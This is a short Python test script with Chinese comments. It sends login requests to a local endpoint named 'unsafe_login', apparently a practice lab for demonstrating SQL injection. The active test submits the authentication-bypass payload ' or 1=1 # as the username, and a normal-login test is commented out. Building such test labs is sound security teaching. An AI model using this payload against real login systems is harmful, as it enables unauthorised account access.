import requests

# 测试正常登录
# def test_normal_login():
#     url = "http://127.0.0.1:5000/unsafe_login"
#     # 发送JSON参数
#     data = {
#         "username": "test_user",
#         "password": "123456"
#     }
#     response = requests.post(url, json=data)
#     print("正常登录返回：", response.json())

# 测试注入绕过
def test_inject_login():
    url = "http://127.0.0.1:5000/unsafe_login"
    # 注入参数：' or 1=1 #
    data = {
        "username": "' or 1=1 #",
        "password": "3344"
    }
    response = requests.post(url, json=data)
    print("注入登录返回：", response.json())

if __name__ == "__main__":
    # test_normal_login()
     test_inject_login()  # 注释取消后测试注入